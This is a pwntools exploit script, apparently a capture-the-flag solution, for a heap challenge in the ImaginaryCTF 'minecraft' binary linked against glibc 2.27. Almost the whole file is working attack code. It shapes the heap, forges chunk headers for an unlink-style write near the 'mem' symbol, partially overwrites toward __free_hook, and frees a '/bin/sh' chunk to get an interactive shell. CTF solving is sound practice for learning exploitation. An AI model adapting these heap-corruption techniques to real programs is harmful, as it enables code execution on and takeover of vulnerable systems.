#!/usr/bin/python
from __future__ import annotations
from heapq import heapify, heapreplace
from typing import List, Tuple, Dict
from pwn import *
import struct
from pwnlib.tubes.remote import remote
from pwnlib.tubes.process import process
from pwnlib.util.packing import u8, u16, u32, u64, p8, p16, p32, p64

def varU64(b: bytes) -> int:
    return u64(b.ljust(8, b"\x00"))


def varU32(b: bytes) -> int:
    return u32(b.ljust(4, b"\x00"))


def protect(pos: int, ptr: int) -> int:
    return (pos >> 12) ^ ptr

class Tcache:
    def __init__(self):
        counts: Dict[int, int] = {}
        tcahche: Dict[int, int] = {}
        for i in range(0x20, 0x420, 0x10):
            counts[i] = 0
            tcahche[i] = 0
        self.counts = counts
        self.tcahche = tcahche

    def add(self, cache, val):
        if isinstance(val, tuple):
            c, ptr = val
        elif isinstance(val, int):
            c = 1
            ptr = val
        else:
            raise Exception("not accepted value")
        self.counts[cache] += c
        self.tcahche[cache] = ptr

    def __getitem__(self, key) -> Tuple[int, int]:
        return (self.counts[key], self.tcahche[key])

    def __setitem__(self, key, val) -> None:
        self.add(key, val)

    def pack(self) -> None:
        ret = b""
        counts = sorted(self.counts.keys())
        tcahche = sorted(self.tcahche.keys())
        for i in counts:
            ret += p16(self.counts[i])
        for i in tcahche:
            ret += p64(self.tcahche[i])
        return ret

    def __bytes__(self):
        return self.pack()


elfPath = "./chall"
libcPath = "./libc-2.27.so"

elf = ELF(elfPath)
libc = ELF(libcPath)

terminalSetting = ["tmux", "new-window"]
context.clear(terminal=terminalSetting, binary=elf)

gdbscript = """
# source debug.gdb
set substitute-path /build/glibc-uZu3wS/glibc-2.27/ glibc-2.27/
define mem
    set $mem = (uint64_t [0x10])mem
    p/a $mem
end
b system
b malloc_printerr
b printf
set follow-fork-mode child
continue
"""

env = {"LD_PRELOAD": libcPath}

if args["REMOTE"]:
    io: remote = remote("minecraft.chal.imaginaryctf.org", 1337)
else:
    if not args["GDB"]:
        io: process = process(elfPath, env=env, stdout=PIPE, stdin=PIPE, stderr=PIPE)
    if args["ATTACH"]:
        pwnlib.gdb.attach(io, exe=elfPath, gdbscript=gdbscript)
    if args["GDB"]:
        io: process = pwnlib.gdb.debug(elfPath, exe=elfPath, env=env, gdbscript=gdbscript, stdout=PIPE, stdin=PIPE, stderr=PIPE)

mem = elf.symbols['mem']
free_hook = libc.symbols['__free_hook'] & 0xffff

def create(idx: int, size: int, data: bytes) -> None:
    io.sendlineafter(b"poem", b"p")
    io.sendlineafter(b":", f"{idx}".encode())
    io.sendlineafter(b":", f"{size}".encode())
    io.send(data)

def edit(idx: int, data: bytes) -> None:
    io.sendlineafter(b"poem", b"r")
    io.sendlineafter(b":", f"{idx}".encode())
    io.send(data)

def delete(idx: int, keep: bool = False) -> None:
    io.sendlineafter(b"poem", b"b")
    io.sendlineafter(b":", f"{idx}".encode())
    io.sendlineafter(b"?", b"y" if keep else b"n")

create(0, 0x500, b"A"*0x80)
create(1, 0x500, b"B"*0x80)
create(2, 0x500, flat({
    0xe8: p64(0x21),
    0xe8+0x20: p64(0x21)
}, filler=b"C"))
create(15, 0x511, b"D"*0x80)

delete(0)
delete(1, True)

create(0, 0xa10, flat({
    0x508: p64(0x601)
}))
delete(1)
delete(2)

create(1, 0x5f0, flat({
    0x0: b"/bin/sh\x00",
    0x500: p64(0x0),
    0x508: p64(0x511),
    0x510: p64(mem-0x18),
    0x518: p64(mem-0x10),
}))

create(2, 0x500, b"D"*0x80)

create(3, 0x500, p16(free_hook))

pause()
edit(0, p64(0x00401110))

io.sendlineafter(b"poem", b"b")
io.sendlineafter(b":", f"{0x1}".encode())

io.sendline(b"ls")

io.interactive()
io.close()
